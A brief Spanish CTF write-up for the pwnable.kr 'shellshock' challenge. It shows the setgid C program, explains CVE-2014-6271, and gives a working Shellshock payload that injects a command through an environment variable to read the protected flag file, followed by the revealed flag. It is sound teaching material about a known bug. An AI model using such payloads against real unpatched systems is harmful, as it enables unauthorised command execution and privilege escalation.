# shellshock

![img](https://github.com/Calana2/Wargame_Writeups/blob/main/pwnable.kr/Legacy_Challenges/shellshock/shellshock.jpeg)

```
shellshock@ubuntu:~$ ls -l
total 960
-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash
-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c
```

### shellshock.c
```C
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```

Este reto estuvo basado en el CVE-2014-6271. Una vulnerabilidad que permitía ejecutar un comando arbitrario bajo privilegios del propietario de la shell antes de ejecutar el comando real:

```
shellshock@ubuntu:~$ which cat
/bin/cat
shellshock@ubuntu:~$ env x='() { :; }; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault
```

`only if I knew CVE-2014-6271 ten years ago..!!`

